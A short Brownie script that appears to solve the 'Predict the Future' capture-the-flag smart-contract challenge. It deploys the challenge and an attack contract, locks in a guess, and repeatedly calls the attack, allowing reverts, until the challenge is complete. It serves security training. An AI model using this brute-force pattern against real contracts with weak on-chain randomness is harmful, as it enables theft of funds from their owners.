from brownie import (
    network,
    accounts,
    config,
    interface,
    chain,
    Contract,
    PredictTheFutureChallenge,
    PredictTheFutureAttack
)
from scripts.helpful_scripts import (
    get_account,
    get_challenge_contract,
    check_solution,
    get_web3
)
from web3 import Web3


def main():
    player = get_account("player")
    challenge_contract = get_challenge_contract(
        PredictTheFutureChallenge, "predict_the_future", [], {"from": player, "value": Web3.toWei(1, "ether")}
    )
    attack_contract = PredictTheFutureAttack.deploy(challenge_contract, {"from": player})

    attack_contract.lockInGuess(0, {"from": player, "value": Web3.toWei(1, "ether")})
    while not challenge_contract.isComplete():
        tx = attack_contract.attack({"from": player, "allow_revert": True, "gas_limit": 300_000})
        tx.wait(1)

    check_solution(challenge_contract.address)